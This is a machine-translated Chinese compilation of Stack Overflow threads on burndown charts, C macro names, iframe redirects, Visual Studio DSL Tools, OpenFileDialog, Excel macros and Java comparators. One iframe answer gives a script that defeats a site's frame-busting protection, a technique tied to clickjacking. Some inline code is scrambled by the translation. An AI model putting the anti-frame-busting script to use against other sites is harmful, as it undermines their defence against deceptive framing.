我的团队发现的另一件有用的事情是使用堆叠折线图，其中“待办事项”、“进行中”、“准备 QA”和“已验证”各有一条线。这样，很容易看到创建备份的过程中的任何阶段。

* * *

## 回答 #9

> 赞同：-1
> 
> 时间：2011-08-11T09:14:45.553

使用剩余时间用于 Sprint 燃尽 - 在 sprint 计划期间，根据您对完成的定义估计完成故事的所有工作 - 每天，开发人员和测试人员重新估计他们所有工作的剩余时间（向上或向下变化） - 跟踪通过剩余小时数的冲刺燃尽 - 一个冲刺进展好坏的重要指标

这不适用于发布燃尽图，因为您不会分解待办事项中的所有故事，而只会分解 sprint 计划研讨会中下一个 sprint 的故事。因此，请使用故事点燃尽图（整个团队在规划扑克会议期间得出的相对规模和复杂性值）。这是您发布进度的重要指标。

# c - 宏名称的有效字符是什么？

> ID：369495
> 
> 赞同：49
> 
> 时间：2008-12-15T19:49:19.040
> 
> 标签：c, compiler-warnings, c-preprocessor

C 风格的宏名称是否遵循与标识符相同的命名规则？编译器升级后，它现在针对旧版应用程序发出此警告：

```
warning #3649-D: white space is required between the macro name "CHAR_" and its replacement text
  #define         CHAR_&        38 
```

这行代码为 & 符号定义了一个 ASCII 值常量。

```
#define   DOL_SN        36
#define   PERCENT       37
#define   CHAR_&        38
#define   RT_SING       39
#define   LF_PAR        40 
```

我假设这个定义（据我所知，实际上并没有被任何代码引用）是错误的，应该更改为“CHAR_AMPERSAND”之类的东西？

* * *

## 回答 #1

> 赞同：44
> 
> 时间：2008-12-15T20:02:23.957

宏名称只能由字母数字字符和下划线组成，即`'a-z'`、`'A-Z'`、`'0-9'`和`'_'`，并且第一个字符不能是数字。一些预处理器也允许使用美元符号字符`'$'`，但你不应该使用它；不幸的是，我不能引用 C 标准，因为我没有它的副本。

从[GCC 文档](http://gcc.gnu.org/onlinedocs/cpp/Tokenization.html#Tokenization)：

> 预处理标记分​​为五类：标识符、预处理数字、字符串文字、标点符号等。*标识符*与 C 中的 标识符相同：任何以字母或下划线开头的字母、数字或下划线序列。C的关键字对预处理器没有意义；它们是普通的标识符。例如，您可以定义名称为关键字的宏。唯一可以被视为预处理关键字的标识符是 `defined`. 请参见定义。
> 
> 对于使用 C 预处理器的其他语言来说，这主要是正确的。但是，即使在预处理器中，C++ 的一些关键字也很重要。请参阅 C++ 命名运算符。
> 
> 在 1999 C 标准中，标识符可能包含不属于“基本源字符集”的字母，由实现自行决定（例如带重音的拉丁字母、希腊字母或中国表意文字）。这可以通过扩展字符集或`'\u'`转义`'\U'`序列来完成。这个特性在 GCC 中的实现是实验性的；此类字符仅在 `'\u'`and`'\U'`形式中被接受，并且仅在 使用时才被接受`-fextended-identifiers`。
> 
> 作为扩展，GCC 将`'$'`其视为一个字母。这是为了与某些系统兼容，例如 VMS，其中`'$'` 通常用于系统定义的函数和对象名称。`'$'`不是严格符合模式的字母，或者如果您指定了`-$`选项。请参阅调用。

* * *

## 回答 #2

> 赞同：16
> 
> 时间：2015-12-16T14:57:26.033

`clang`允许很多“疯狂”的角色..虽然我一直在努力寻找~~任何~~押韵或理由——至于*为什么* **有些**被允许，而有些则**不允许**。例如..

```
#define   ?:          /// WORKS FINE
#define  ￭  @end        /// WORKS FINE
#define   @interface  /// WORKS FINE
#define Ｐ  @protocol   /// WORKS FINE 
```

然而

```
#define ☎   TEL     /// ERROR: Macro name must be an identifier.
#define ❌   NO     /// ERROR: Macro name must be an identifier.
#define ⇧   UP      /// ERROR: Macro name must be an identifier.
#define 〓   ==     /// ERROR: Macro name must be an identifier.
#define   APPLE   /// ERROR: Macro name must be an identifier. 
```

*谁知道。* 我很想……但到目前为止，谷歌让我失望了。任何有关该主题的见解，将不胜感激™️。

* * *

## 回答 #3

> 赞同：8
> 
> 时间：2008-12-15T20:06:26.057

没错，就名称而言，相同的规则适用于宏和标识符：有效字符是 [A-Za-z0-9_]。

使用大写名称将宏与其他标识符（变量和函数名称）区分开是很常见的用法。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2008-12-15T20:07:59.203

为变量名称指定有效标识符的相同规则适用于宏名称，但宏可能具有与关键字相同的名称。标识符名称中的有效字符包括`digits`并且`non-digits`不能以数字开头。 `non-digits`包括大写字母 AZ、小写字母 az、下划线和任何实现定义的字符。

# javascript - 如何防止 IFRAME 重定向顶级窗口

> ID：369498
> 
> 赞同：140
> 
> 时间：2008-12-15T19:50:55.197
> 
> 标签：javascript, html, iframe

一些网站有代码来“突破”`IFRAME`外壳，这意味着如果页面作为父页面内部`A`加载，则某些 Javascript会将外部窗口重定向到.`IFRAME``P``A``A`

通常这个 Javascript 看起来像这样：

```
<script type="text/javascript">
  if (top.location.href != self.location.href)
     top.location.href = self.location.href;
</script> 
```

我的问题是：作为父页面`P`的作者而不是内页的作者，我该`A`如何防止`A`这种突破？

PS 在我看来，这应该是跨站点安全违规，但事实并非如此。

* * *

## 回答 #1

> 赞同：131
> 
> 时间：2012-03-26T21:47:26.097

在 HTML5 中，添加了[iframe 沙盒](http://www.w3schools.com/tags/att_iframe_sandbox.asp)属性。在撰写本文时，它[适用于 Chrome、Safari、Firefox 以及最新版本的 IE 和 Opera](http://caniuse.com/iframe-sandbox)，但几乎可以满足您的需求：

```
<iframe src="url" sandbox="allow-forms allow-scripts"></iframe> 
```

如果您想*允许*顶级重定向，请指定`sandbox="allow-top-navigation"`.

* * *

## 回答 #2

> 赞同：58
> 
> 时间：2014-01-25T06:47:09.447

我使用沙盒标签

*   `allow-forms`允许表单提交
*   `allow-popups`允许弹出窗口
*   `allow-pointer-lock`允许指针锁定
*   `allow-same-origin`允许文档保持其来源
*   `allow-scripts`允许 JavaScript 执行，也允许特性自动触发
*   `allow-top-navigation`允许文档通过导航顶级窗口跳出框架

**顶部导航是您想要阻止的，因此将其排除在外，这样就不会被允许。任何遗漏的都会被阻止**

前任。

```
<iframe sandbox="allow-same-origin allow-scripts allow-popups allow-forms" src="http://www.example.com"</iframe> 
```

* * *

## 回答 #3

> 赞同：44
> 
> 时间：2008-12-15T20:21:35.777

尝试使用 onbeforeunload 属性，它可以让用户选择是否要离开页面。

示例：[https ://developer.mozilla.org/en-US/docs/Web/API/Window.onbeforeunload](https://developer.mozilla.org/en-US/docs/Web/API/Window.onbeforeunload)

在 HTML5 中，您可以使用沙盒属性。请参阅下面的 Pankrat 的回答。 [http://www.html5rocks.com/en/tutorials/security/sandboxed-iframes/](http://www.html5rocks.com/en/tutorials/security/sandboxed-iframes/)

* * *

## 回答 #4

> 赞同：9
> 
> 时间：2013-08-06T06:36:08.573

阅读[w3.org 规范](http://www.w3.org/TR/html5/browsers.html#valid-browsing-context-name-or-keyword)后。我找到了沙盒属性。

您可以设置`sandbox=""`，以防止 iframe 重定向。话虽如此，它也不会重定向 iframe。您将基本上失去点击。

此处的示例：http: [//jsfiddle.net/ppkzS/1/](http://jsfiddle.net/ppkzS/1/)
没有沙箱的示例：http: [//jsfiddle.net/ppkzS/](http://jsfiddle.net/ppkzS/)

* * *

## 回答 #5

> 赞同：5
> 
> 时间：2012-08-03T16:03:58.897

我知道问题已经很长时间了，但这是我的改进版本，只有在加载 iframe 时，它​​才会等待 500 毫秒以进行任何后续调用。

```
<script type="text/javasript">
var prevent_bust = false ;
    var from_loading_204 = false;
    var frame_loading = false;
    var prevent_bust_timer = 0;
    var  primer = true;
    window.onbeforeunload = function(event) {
        prevent_bust = !from_loading_204 && frame_loading;
        if(from_loading_204)from_loading_204 = false;
        if(prevent_bust){
            prevent_bust_timer=500;
        }
    }
    function frameLoad(){
        if(!primer){
            from_loading_204 = true;
            window.top.location = '/?204';
            prevent_bust = false;
            frame_loading = true;
            prevent_bust_timer=1000;
        }else{
            primer = false;
        }
    }
    setInterval(function() {  
        if (prevent_bust_timer>0) {  
            if(prevent_bust){
                from_loading_204 = true;
                window.top.location = '/?204';
                prevent_bust = false;
            }else if(prevent_bust_timer == 1){
                frame_loading = false;
                prevent_bust = false;
                from_loading_204 = false;
                prevent_bust_timer == 0;
            }

        }
        prevent_bust_timer--;
        if(prevent_bust_timer==-100) {
            prevent_bust_timer = 0;
        }
    }, 1);
</script> 
```

并且必须添加到框架或 iframe `onload="frameLoad()"`。 `onreadystatechange="frameLoad();"`

* * *

## 回答 #6

> 赞同：4
> 
> 时间：2010-03-22T22:53:06.837

我发现了一些有用的技巧：

[使用 JS 如何阻止子 iframe 重定向或至少提示用户重定向](https://stackoverflow.com/questions/1794974/using-js-how-can-i-stop-child-iframes-from-redirecting-or-at-least-prompt-users)

[http://www.codinghorror.com/blog/2009/06/we-done-been-framed.html](http://www.codinghorror.com/blog/2009/06/we-done-been-framed.html)

[http://coderrr.wordpress.com/2009/02/13/preventing-frame-busting-and-click-jacking-ui-redressing/](http://coderrr.wordpress.com/2009/02/13/preventing-frame-busting-and-click-jacking-ui-redressing/)

* * *

## 回答 #7

> 赞同：2
> 
> 时间：2009-01-22T12:30:01.833

由于您在 iframe 中加载的页面可以使用 setInterval 执行“中断”代码，因此 onbeforeunload 可能不是那么实用，因为它可能会使用户感到“你确定要离开吗？” 对话框。

还有只适用于 IE 和 Opera 的 iframe 安全属性

:(

* * *

## 回答 #8

> 赞同：2
> 
> 时间：2010-01-26T12:12:37.573

在我的情况下，我希望用户访问内部页面，以便服务器将他们的 ip 视为访问者。如果我使用 php 代理技术，我认为内页会将我的服务器 ip 视为访问者，因此不好。到目前为止，我得到的唯一解决方案是 onbeforeunload。把它放在你的页面上：

```
<script type="text/javascript">
    window.onbeforeunload = function () {                       
         return "This will end your session";
    }
</script> 
```

这在 Firefox 和 IE 中都有效，这就是我测试的。您会发现使用 evt.return(whatever) crap 之类的版本...在 Firefox 中不起作用。

* * *

## 回答 #9

> 赞同：0
> 
> 时间：2008-12-15T20:17:59.417

通过这样做，您将能够控制框架页面的任何操作，而这是您无法做到的。[同域源策略](http://en.wikipedia.org/wiki/Same_origin_policy)适用。

# .net - Microsoft Visual Studio SDK DSL 工具 - 有认真的人吗？

> ID：369504
> 
> 赞同：10
> 
> 时间：2008-12-15T19:53:51.730
> 
> 标签：.net, visual-studio, dsl, dsl-tools, visual-studio-sdk

我们正在考虑使用 Microsoft DSL 工具包来创建一些抽象设计器。我已经做了一些 POC，但想得到一些关于相同的意见。

有人在这里分享他们使用 Microsoft DSL Toolkit 和 T4 的经验吗？此外，任何指向开源 DSL 项目的指针都会有所帮助——例如。Microsoft 服务工厂建模版严重依赖 DSL 工具包。

由于 OSLO/Quadrant 需要一些时间才能发布，我认为我们唯一的选择是依靠 Microsoft DSL 设计器。（[参见 Kieth 的博客](http://blogs.msdn.com/keith_short/archive/2008/11/06/oslo-and-the-dsl-toolkit.aspx)）

另外，这里有一些我已经掌握的关于 DSL 的信息：

1 - [MSDN 中关于 DSL 工具的一个不错的实验室](http://code.msdn.microsoft.com/DSLToolsLab)

2 - [Codeplex 中使用 DSL 工具包的项目列表](http://www.codeplex.com/site/search?ProjectSearchText=DSL)

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2009-03-18T03:34:05.230

我们已经对 DSL 进行了大量的工作，其中有一些是供内部和基于客户的顾问使用的，尽管使用它们完成大部分工作的不是我。一旦你完成了建模（不小的壮举），我会说这些都是很棒的工具。

我不能遗憾地指出任何开源项目，我还要补充一点，在启动和运行非平凡的 DSL 方面的投资是相当大的，但是如果你做对了，那么生产力的提升是令人印象深刻的。

**编辑 - 经过几年的经验，我提出以下意见**：

1.  VS DSL 的大图视觉性能很差，您需要将模型元素折叠起来（隐藏/显示）
2.  具有许多互连线的大型图表难以导航（布局很难）
3.  大型模型在代码生成等方面表现良好，时间主要用于反序列化（如预期的那样）
4.  由于 GUID 数量众多，模型比较很困难
5.  良好的开发人员体验需要对开箱即用的属性对话框进行大量开发。
6.  可以对模型进行加密以保护 IP，这使得以后比较非常困难（但对于所有加密文件都是如此。）

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2009-07-12T03:05:24.433

我看过 Visual Studio DSL 工具包的使用。最终，我发现这些工具远非限制性的。需要一个 GUI，而没有任何能力轻松描述底层文本语法，这对我来说似乎是不够的。我需要能够在没有 GUI 的情况下轻松使用 DSL。

Oslo 似乎正朝着一个非常奇怪的方向发展，将 DSL 的所有元数据存储在 SQL DB 中。这对我来说似乎无关紧要，而且肯定会减慢速度，特别是如果您想要快速集成 IDE。诚然，我没有深入研究它，所以它可能比我对它的印象更好。

顺便说一句，我最近使用[Antlr](http://www.antlr.org/)实现了一个 DSL 。[您可以在此处](https://stackoverflow.com/questions/1109237/for-what-kind-of-problems-do-you-use-a-dsl/1110167#1110167)找到我的帖子作为对关于 SO 的问题的回复

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2009-07-12T02:30:02.370

除了上述之外，用于对象角色建模的[NORMA](http://www.ormfoundation.org/files/folders/norma_the_software/default.aspx)工具是建立在 DSL 工具上的。这是一个非常复杂的示例，说明了可以使用它们做什么，并演示了使用 XML 转换进行模型转换和代码生成。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2009-03-19T12:17:24.137

我绝对是一个认真的接受者。Ivé 最近制作了一个 dsl 来为订购系统的订购流程建模。我们使用一个 windowsservice，它根据特定行的进程状态连接到不同的 web 服务，然后根据结果（下一步、错误、拒绝）更改状态。手动编辑该数据库表非常耗时，因此我为 sql 代码制作了一种语言和生成器。

我必须检查是否允许我发布项目中的任何代码，但我发布了数据库结构，以便您了解为什么手动编辑它很困难。我必须为 aprox 输入数据。10 个订单流程，每个流程包含 5-20 个步骤，每个步骤都包含操作和所有内容（ProcessActionId 是对 Web 服务的引用）。

```
CREATE TABLE [dbo].[OrderProcessStep](
    [OrderProcessCode] [int] NOT NULL,
    [PreviousProcessStatusCode] [int] NOT NULL,
    [NextProcessStatusCode] [int] NULL,
    [DenialProcessStatusCode] [int] NULL,
    [ErrorProcessStatusCode] [int] NULL,
    [ProcessActionId] [int] NULL,
    [StepComment] [varchar](500) NOT NULL,
    [SecondsToNext] [int] NULL,
    [SecondsToError] [int] NULL,
    [SecondsToDenial] [int] NULL,
 CONSTRAINT [PK_OrderProcess] PRIMARY KEY CLUSTERED 
(
    [OrderProcessCode] ASC,
    [PreviousProcessStatusCode] ASC
) 
```

# .net - ./ 使用 OpenFileDialog 时更改目标

> ID：369506
> 
> 赞同：1
> 
> 时间：2008-12-15T19:54:10.013
> 
> 标签：.net, c++, relative-path, openfiledialog

我正在使用 streamwriter 记录错误

它的设计方式（请不要问为什么）是每次应用程序必须记录消息时打开一个新的流写入器。它将所有内容输出到 ./Logs/[current-date].txt，通常解析为“c:\myappfolder\logs[current-date].txt”

一切正常，但是在我使用打开的文件对话框说“C:\home\myfolder\myfile”之后，streamwriter 尝试写入“c:\home\myfolder\logs[current-date].txt”

我知道这个问题的解决方案，但我只是不明白发生了什么

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2008-12-15T19:57:39.380

当前目录是进程范围的值。

`OpenFileDialog`正在更改当前目录。

如果您使用的是 .NET`OpenFileDialog`类，则可以将`RestoreDirectory`属性设置`true`为告诉对话框不理会当前目录（尽管`RestoreDirectory`编写文档的方式可能存在一些线程问题，我想这可能会使这仍然不合适对于伐木设施）。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2008-12-15T20:02:17.420

正如 Mike B 所说，`OpenFileDialog`可能会更改当前目录。由于`./`是相对于电流的，所以它也会改变。

该`RestoreDirectory`属性会修改此行为。

而是做这样的事情：

```
OpenFileDialog openFileDialog1 = new OpenFileDialog();

OpenFileDialog1.InitialDirectory = "c:\\" ;
openFileDialog1.Filter = "txt files (*.txt)|*.txt|All files (*.*)|*.*" ;
openFileDialog1.FilterIndex = 2 ;
openFileDialog1.RestoreDirectory = true ; 
```

取自[MSDN](http://msdn.microsoft.com/en-us/library/system.windows.forms.openfiledialog.aspx)。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2008-12-15T20:08:10.763

[迈克 B](https://stackoverflow.com/questions/369506/changes-target-when-i-use-openfiledialog#369513)完全正确。

如果您使用的是本机 API 而不是 .NET，则需要在 OPENFILENAME 结构中设置 OFN_NOCHANGEDIR 选项。该文档指出它不适用于 Windows XP，但不确定这是否适用于 .NET 版本。

无论您如何解决此问题，请注意，每次打开文件对话框时，它都会在您的原始文件夹中打开。如果您打开大量文件，治疗可能比疾病更糟糕。您最好在程序启动时获取当前目录，并将其添加到您的文件名中。

# excel - 用代码 (VB.NET) 操作文件而不执行文件的宏

> ID：369510
> 
> 赞同：1
> 
> 时间：2008-12-15T19:56:04.407
> 
> 标签：excel, vba, vb.net

我有一个 Excel 文件，里面有一堆 VBA 和宏代码。当我在 Excel 中打开文件时，我可以选择不“启用”它们——因此字段中的值都保持上次保存时的状态。我需要在上次保存时操作这些值 - 所以我不希望宏（查看当前日期并相应地更新值）运行。

当我通过我们的点网代码打开它时：

```
Dim oxlRep As Excel.Application
Dim oWBRep As Excel.Workbook
Dim oSheetRep As Excel.Worksheet
Dim oRngRep As Excel.Range
oxlRep.Open(path) 
```

vb 代码运行 - 抛出值。我一直在寻找一种在没有宏的情况下打开它的方法，或者在不运行宏的“安全”模式下打开它。如果我只是双击该文件并且不选择启用宏，那么这些值就如我所愿。

通常我们在创建文件的当月内运行此代码，因此在它运行的 3 或 4 年中我们还没有看到这个问题。现在我需要回到一些旧文件并运行一些存档代码......

有人有建议吗？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2008-12-15T20:22:42.917

```
Application.AutomationSecurity = msoAutomationSecurity.msoAutomationSecurityForceDisable 
```

尝试在此语句之后打开工作簿。我认为，这将禁用应用程序级别的宏（而不是工作簿级别）

希望有帮助。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2008-12-15T20:26:19.103

ADO对你有用吗？恐怕我只能举一个脚本示例。

```
strLinkFile = "C:\Docs\LTD.xls"

Set cn = CreateObject("ADODB.Connection")
cn.Open "Provider=Microsoft.Jet.OLEDB.4.0;" & _
       "Data Source=" & strLinkFile & ";" & _
       "Extended Properties=""Excel 8.0;HDR=YES;"""

Set rs = CreateObject("ADODB.Recordset")
rs.Open "Select * from [Sheet1$A1:B5]", cn, adOpenStatic 
```

# java - 如何按多个字段比较对象

> ID：369512
> 
> 赞同：291
> 
> 时间：2008-12-15T19:56:43.767
> 
> 标签：java, oop

假设您有一些对象有几个字段，它们可以通过以下方式进行比较：

```
public class Person {

    private String firstName;
    private String lastName;
    private String age;

    /* Constructors */

    /* Methods */

} 
```

所以在这个例子中，当你问是否：

```
a.compareTo(b) > 0 
```

您可能会问 a 的姓是否在 b 之前，或者 a 是否比 b 大，等等...

在不增加不必要的混乱或开销的情况下，在这些类型的对象之间进行多重比较的最简洁的方法是什么？

*   `java.lang.Comparable`界面只允许通过一个字段进行比较
*   在我看来，添加许多比较方法（即`compareByFirstName()`,`compareByAge()`等...）很混乱。

那么解决这个问题的最佳方法是什么？

* * *

## 回答 #1

> 赞同：496
> 
> 时间：2014-08-26T08:25:50.857

使用 Java 8：

```
Comparator.comparing((Person p)->p.firstName)
          .thenComparing(p->p.lastName)
          .thenComparingInt(p->p.age); 
```

如果您有访问器方法：

```
Comparator.comparing(Person::getFirstName)
          .thenComparing(Person::getLastName)
          .thenComparingInt(Person::getAge); 
```

如果一个类实现了 Comparable 那么这样的比较器可以在 compareTo 方法中使用：

```
@Override
public int compareTo(Person o){
    return Comparator.comparing(Person::getFirstName)
              .thenComparing(Person::getLastName)
              .thenComparingInt(Person::getAge)
              .compare(this, o);
} 
```

* * *

## 回答 #2

> 赞同：177
> 
> 时间：2008-12-15T22:07:40.927

你应该实施`Comparable <Person>`. 假设所有字段都不为null（为简单起见），即age为int，比较排名为first、last、age，`compareTo`方法很简单：

```
public int compareTo(Person other) {
    int i = firstName.compareTo(other.firstName);
    if (i != 0) return i;

    i = lastName.compareTo(other.lastName);
    if (i != 0) return i;

    return Integer.compare(age, other.age);
} 
```

* * *

## 回答 #3

> 赞同：120
> 
> 时间：2013-11-20T10:41:08.837

（来自[基于多个字段对 Java 中的对象列表进行排序的方法](http://blog.bennybottema.com/2013/06/21/ways-to-sort-lists-of-objects-in-java-based-on-multiple-fields/)）

[本要点](https://gist.github.com/bbottema/b891b25bf56e0ccb1f83)中的工作代码

## 使用 Java 8 lambda（2019 年 4 月 10 日添加）

Java 8 通过 lambda 很好地解决了这个问题（尽管 Guava 和 Apache Commons 可能仍然提供更大的灵活性）：

```
Collections.sort(reportList, Comparator.comparing(Report::getReportKey)
            .thenComparing(Report::getStudentNumber)
            .thenComparing(Report::getSchool)); 
```

感谢@gaaoong[下面的回答](https://stackoverflow.com/a/36367245/441662)。

## 凌乱而复杂：手工排序

```
Collections.sort(pizzas, new Comparator<Pizza>() {  
    @Override  
    public int compare(Pizza p1, Pizza p2) {  
        int sizeCmp = p1.size.compareTo(p2.size);  
        if (sizeCmp != 0) {  
            return sizeCmp;  
        }  
        int nrOfToppingsCmp = p1.nrOfToppings.compareTo(p2.nrOfToppings);  
        if (nrOfToppingsCmp != 0) {  
            return nrOfToppingsCmp;  
        }  
        return p1.name.compareTo(p2.name);  
    }  
}); 
```

这需要大量的打字、维护并且容易出错。

## 反思方式：使用 BeanComparator 进行排序

```
ComparatorChain chain = new ComparatorChain(Arrays.asList(
   new BeanComparator("size"), 
   new BeanComparator("nrOfToppings"), 
   new BeanComparator("name")));

Collections.sort(pizzas, chain); 
```

显然，这更简洁，但更容易出错，因为您使用字符串代替了对字段的直接引用（没有类型安全，自动重构）。现在，如果一个字段被重命名，编译器甚至不会报告问题。此外，由于该解决方案使用反射，因此排序要慢得多。

## 到达那里：使用 Google Guava 的 ComparisonChain 进行排序

```
Collections.sort(pizzas, new Comparator<Pizza>() {  
    @Override  
    public int compare(Pizza p1, Pizza p2) {  
        return ComparisonChain.start().compare(p1.size, p2.size).compare(p1.nrOfToppings, p2.nrOfToppings).compare(p1.name, p2.name).result();  
        // or in case the fields can be null:  
        /* 
        return ComparisonChain.start() 
           .compare(p1.size, p2.size, Ordering.natural().nullsLast()) 
           .compare(p1.nrOfToppings, p2.nrOfToppings, Ordering.natural().nullsLast()) 
           .compare(p1.name, p2.name, Ordering.natural().nullsLast()) 
           .result(); 
        */  
    }  
}); 
```

这要好得多，但是对于最常见的用例需要一些样板代码：默认情况下，空值的值应该较小。对于空字段，您必须为 Guava 在这种情况下做什么提供额外的指令。如果您想做一些特定的事情，这是一种灵活的机制，但通常您需要默认情况（即 1、a、b、z、null）。

## 使用 Apache Commons CompareToBuilder 进行排序

```
Collections.sort(pizzas, new Comparator<Pizza>() {  
    @Override  
    public int compare(Pizza p1, Pizza p2) {  
        return new CompareToBuilder().append(p1.size, p2.size).append(p1.nrOfToppings, p2.nrOfToppings).append(p1.name, p2.name).toComparison();  
    }  
}); 
```

与 Guava 的 ComparisonChain 一样，这个库类可以轻松地对多个字段进行排序，而且还定义了 null 值的默认行为（即 1、a、b、z、null）。但是，您也不能指定任何其他内容，除非您提供自己的比较器。

## 因此

最终归结为风味和灵活性需求（Guava 的 ComparisonChain）与简洁的代码（Apache 的 CompareToBuilder）。

## 奖金方式

[我找到了一个很好的解决方案，它在 CodeReview](https://codereview.stackexchange.com/a/74764/52676)中按优先级顺序组合了多个比较器`MultiComparator`：

```
class MultiComparator<T> implements Comparator<T> {
    private final List<Comparator<T>> comparators;

    public MultiComparator(List<Comparator<? super T>> comparators) {
        this.comparators = comparators;
    }

    public MultiComparator(Comparator<? super T>... comparators) {
        this(Arrays.asList(comparators));
    }

    public int compare(T o1, T o2) {
        for (Comparator<T> c : comparators) {
            int result = c.compare(o1, o2);
            if (result != 0) {
                return result;
            }
        }
        return 0;
    }

    public static <T> void sort(List<T> list, Comparator<? super T>... comparators) {
        Collections.sort(list, new MultiComparator<T>(comparators));
    }
} 
```

当然，Apache Commons Collections 已经为此提供了一个实用程序：

[ComparatorUtils.chainedComparator(comparatorCollection)](http://commons.apache.org/proper/commons-collections/javadocs/api-2.1.1/org/apache/commons/collections/ComparatorUtils.html#chainedComparator(java.util.Collection))

```
Collections.sort(list, ComparatorUtils.chainedComparator(comparators)); 
```

* * *

## 回答 #4

> 赞同：89
> 
> 时间：2008-12-15T20:06:51.780

您可以实现`Comparator`比较两个`Person`对象的 a，并且可以检查任意数量的字段。您可以在比较器中放入一个变量，告诉它要与哪个字段进行比较，尽管只编写多个比较器可能会更简单。

* * *

## 回答 #5

> 赞同：23
> 
> 时间：2011-07-10T18:38:37.377

@Patrick 要连续排序多个字段，请尝试[ComparatorChain](https://commons.apache.org/proper/commons-collections/javadocs/api-2.1.1/org/apache/commons/collections/comparators/ComparatorChain.html)

> ComparatorChain 是一个 Comparator，它依次包装了一个或多个 Comparator。ComparatorChain 按顺序调用每个 Comparator 直到 1) 任何单个 Comparator 返回非零结果（然后返回该结果），或 2) ComparatorChain 用尽（并返回零）。这种类型的排序与 SQL 中的多列排序非常相似，并且此类允许 Java 类在对 List 进行排序时模拟这种行为。
> 
> 为了进一步促进类似 SQL 的排序，列表中任何单个 Comparator 的顺序都可以颠倒。
> 
> 在调用 compare(Object, Object) 之后调用添加新比较器或更改升序/降序排序的方法将导致 UnsupportedOperationException。但是，请注意不要更改底层的比较器列表或定义排序顺序的位集。
> 
> ComparatorChain 的实例不同步。该类在构造时不是线程安全的，但在所有设置操作完成后执行多重比较是线程安全的。

* * *

## 回答 #6

> 赞同：21
> 
> 时间：2014-10-01T13:51:20.063

您始终可以考虑的另一个选择是 Apache Commons。它提供了很多选择。

```
import org.apache.commons.lang3.builder.CompareToBuilder; 
```

前任：

```
public int compare(Person a, Person b){

   return new CompareToBuilder()
     .append(a.getName(), b.getName())
     .append(a.getAddress(), b.getAddress())
     .toComparison();
} 
```

* * *

## 回答 #7

> 赞同：13
> 
> 时间：2008-12-15T23:34:48.600

您还可以查看实现 Comparator 的 Enum。

[http://tobega.blogspot.com/2008/05/beautiful-enums.html](http://tobega.blogspot.com/2008/05/beautiful-enums.html)

例如

```
Collections.sort(myChildren, Child.Order.ByAge.descending()); 
```

* * *

## 回答 #8

> 赞同：12
> 
> 时间：2013-06-26T13:44:37.123

```
import com.google.common.collect.ComparisonChain;

/**
 * @author radler
 * Class Description ...
 */
public class Attribute implements Comparable<Attribute> {

    private String type;
    private String value;

    public String getType() { return type; }
    public void setType(String type) { this.type = type; }

    public String getValue() { return value; }
    public void setValue(String value) { this.value = value; }

    @Override
    public String toString() {
        return "Attribute [type=" + type + ", value=" + value + "]";
    }

    @Override
    public int compareTo(Attribute that) {
        return ComparisonChain.start()
            .compare(this.type, that.type)
            .compare(this.value, that.value)
            .result();
    }

} 
```

* * *

## 回答 #9

> 赞同：9
> 
> 时间：2014-11-11T12:39:33.220

对于那些能够使用 Java 8 流 API 的人来说，这里有一个更简洁的方法有很好的记录： [Lambdas and sort](http://blog.jooq.org/2014/01/31/java-8-friday-goodies-lambdas-and-sorting/)

我正在寻找相当于 C# LINQ 的东西：

```
.ThenBy(...) 
```

我在 Comparator 上找到了 Java 8 中的机制：

```
.thenComparing(...) 
```

所以这里是演示算法的片段。

```
 Comparator<Person> comparator = Comparator.comparing(person -> person.name);
    comparator = comparator.thenComparing(Comparator.comparing(person -> person.age)); 
```

查看上面的链接以获得更简洁的方式以及关于 Java 的类型推断如何使其与 LINQ 相比更笨拙的定义的解释。

这是完整的单元测试供参考：

```
@Test
public void testChainedSorting()
{
    // Create the collection of people:
    ArrayList<Person> people = new ArrayList<>();
    people.add(new Person("Dan", 4));
    people.add(new Person("Andi", 2));
    people.add(new Person("Bob", 42));
    people.add(new Person("Debby", 3));
    people.add(new Person("Bob", 72));
    people.add(new Person("Barry", 20));
    people.add(new Person("Cathy", 40));
    people.add(new Person("Bob", 40));
    people.add(new Person("Barry", 50));

    // Define chained comparators:
    // Great article explaining this and how to make it even neater:
    // http://blog.jooq.org/2014/01/31/java-8-friday-goodies-lambdas-and-sorting/
    Comparator<Person> comparator = Comparator.comparing(person -> person.name);
    comparator = comparator.thenComparing(Comparator.comparing(person -> person.age));

    // Sort the stream:
    Stream<Person> personStream = people.stream().sorted(comparator);

    // Make sure that the output is as expected:
    List<Person> sortedPeople = personStream.collect(Collectors.toList());
    Assert.assertEquals("Andi",  sortedPeople.get(0).name); Assert.assertEquals(2,  sortedPeople.get(0).age);
    Assert.assertEquals("Barry", sortedPeople.get(1).name); Assert.assertEquals(20, sortedPeople.get(1).age);
    Assert.assertEquals("Barry", sortedPeople.get(2).name); Assert.assertEquals(50, sortedPeople.get(2).age);
    Assert.assertEquals("Bob",   sortedPeople.get(3).name); Assert.assertEquals(40, sortedPeople.get(3).age);
    Assert.assertEquals("Bob",   sortedPeople.get(4).name); Assert.assertEquals(42, sortedPeople.get(4).age);
    Assert.assertEquals("Bob",   sortedPeople.get(5).name); Assert.assertEquals(72, sortedPeople.get(5).age);
    Assert.assertEquals("Cathy", sortedPeople.get(6).name); Assert.assertEquals(40, sortedPeople.get(6).age);
    Assert.assertEquals("Dan",   sortedPeople.get(7).name); Assert.assertEquals(4,  sortedPeople.get(7).age);
    Assert.assertEquals("Debby", sortedPeople.get(8).name); Assert.assertEquals(3,  sortedPeople.get(8).age);
    // Andi     : 2
    // Barry    : 20
    // Barry    : 50
    // Bob      : 40
    // Bob      : 42
    // Bob      : 72
    // Cathy    : 40
    // Dan      : 4
    // Debby    : 3
}

/**
 * A person in our system.
 */
public static class Person
{
    /**
     * Creates a new person.
     * @param name The name of the person.
     * @param age The age of the person.
     */
    public Person(String name, int age)
    {
        this.age = age;
        this.name = name;
    }

    /**
     * The name of the person.
     */
    public String name;

    /**
     * The age of the person.
     */
    public int age;

    @Override
    public String toString()
    {
        if (name == null) return super.toString();
        else return String.format("%s : %d", this.name, this.age);
    }
} 
```

* * *

## 回答 #10

> 赞同：8
> 
> 时间：2012-06-07T21:35:58.143

